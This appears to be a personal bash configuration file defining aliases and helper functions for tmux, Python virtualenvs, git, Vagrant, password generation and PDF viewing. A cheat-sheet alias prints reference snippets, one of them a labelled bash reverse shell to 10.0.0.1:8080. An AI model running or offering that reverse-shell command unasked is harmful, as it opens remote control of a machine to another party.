shopt -s expand_aliases

# Snippet to create new tmux session
tns() {
  tmux new-session -d -s $1 && [[ -n "$TMUX" ]] \
    && tmux switch-client -t $1 \
    || tmux attach
}

# Open a PDF in zathura without downloading it
safepdf() {
	wget -q -O - "$1" | firejail zathura - --
}

# Snippet to create python3 virtualenv
workon() {
    VENV=$HOME/.python/venv/$1
    test -d $VENV || python3 -m venv $VENV
    source $VENV/bin/activate
}

gjson() {
	jq -r '.[].url' <(googler --json $*)
}


alias ls='ls --color'
alias ll='ls -alF'
alias la='ls -a'
alias l.='ls -d .[^.]*'

# Common aliases
alias ssh="TERM=screen-256color ssh"
alias zathura="firejail --net=none zathura --mode=fullscreen"

if [[ "$(head -1 /etc/os-release | awk -F'=' '{print$NF}')" == 'Fedora' ]]; then
    alias fd="fd"
else
    alias fd="fdfind"
fi

alias vi="nvim"
alias vim="nvim"

# Fuse
alias lsfuse='egrep "$HOME.+ fuse" /etc/mtab'

# Passwords
alias gentoken="openssl rand -hex"
alias genpass="</dev/urandom tr -dc 'A-Za-z0-9!\"#$%&'\''()*+,-./:;<=>?@[\]^_\`{|}~' | head -c 13 ; echo"

# Licenses
alias license-gpl2="curl -s https://www.gnu.org/licenses/gpl-2.0.txt"
alias license-gpl3="curl -s https://www.gnu.org/licenses/gpl-3.0.txt"

# FASD
alias v="fasd -f -e nvim"
alias b="fasd -f -e bat"
alias o="fasd -f -e xdg-open"

alias open="xdg-open"

# Bash
# alias cat="bat -p"
alias dc="docker-compose"
alias cl="clear"
alias tree="tree -I node_modules -I venv"
alias tL="tree -L 2"
alias fdate="date +%D-%T | sed -e 's#[/:]#.#g'"

# Vagrant
alias vt="vagrant"
alias vup="vagrant up"
alias vsync="vagrant rsync"
alias vssh="vagrant ssh"
alias vdf="vagrant destroy -f"
alias vprov="vagrant provision --provision-with"

# Xorg
alias clip="xsel -s -i"

# TMUX
alias tma="tmux attach"
alias tns="tns"
alias tnw="tnw"
alias tnwm="tnw man"

# Cheatsheets
alias cheatsheet='echo -e "\
# Forward without any command                 # Sort unique        # Wget multiple URLs 
ssh -NR 8888 192.168.0.1                      sort -u              wget -P <directory>/ -i <(cat <<EOF
                                                                   https://test/test1.txt
# Bash reverse shell                          # Strip extension    https://test/test2.txt
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1        echo \${FILE}         EOF)

# History expansion            # Renaming stuffs                                   # For each line of file do something
!$ !! !* !^ !:2 !:2-6 !-2      for f in *; do mv "\$f" "\${f/.csv/.txt}"; done           while read url; do echo $url; done < url.lst\
"'
alias search-cheatsheet='ls -1d $HOME/Cheatsheets/* | grep -i'

# Git
alias gst='git status'
alias gch='git checkout'
alias gcsm='git commit -s -m'
alias gcan='git commit --amend --no-edit'
alias gpfo='git push -f origin $(git rev-parse --abbrev-ref HEAD)'
alias gp='git push --progress'
alias gl='git pull'
alias gd='git diff'
alias ga='git add'
alias gaa='git add .'
alias gb='git branch -a'
alias gch='git checkout'
alias glo="git log --decorate"
alias glog="git log --graph --pretty='%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --all --stat"
alias glg="git log --oneline --decorate --graph --all"
